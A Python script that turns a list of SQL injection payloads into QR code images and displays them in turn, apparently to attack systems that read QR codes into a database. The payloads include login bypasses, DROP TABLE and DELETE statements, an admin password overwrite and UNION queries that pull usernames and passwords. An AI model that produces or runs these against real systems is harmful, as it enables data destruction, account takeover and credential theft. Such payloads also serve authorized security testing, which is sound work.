import qrcode
import random
from PIL import Image
import os
import time

# SQL injection payloads
sql_injections = [
    "' OR 1=1 -- -",
    "' OR 1=1 -- #",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "'; DROP TABLE users;--",
    "'; SELECT * FROM users WHERE username='admin'--",
    "'; DELETE FROM users WHERE username='admin'--",
    "'; UPDATE users SET password='hacked' WHERE username='admin'--",
    "' UNION SELECT username, password FROM users--",
    "' UNION SELECT NULL, NULL, NULL, table_name FROM information_schema.tables--"
]

# Function to generate and save QR code images
def generate_qr_code(text, filename):
    qr = qrcode.QRCode()
    qr.add_data(text)
    qr.make()
    img = qr.make_image(fill_color="black", back_color="white")
    img.save(filename)

# Generate and save 10 QR codes
for i in range(10):
    random_injection = random.choice(sql_injections)
    data = 'roninja' + random_injection
    filename = f"qr_code_{i}.png"
    generate_qr_code(data, filename)

# Rotate and display QR codes
for i in range(10):
    filename = f"qr_code_{i}.png"
    img = Image.open(filename)
    img.show()
    time.sleep(2)
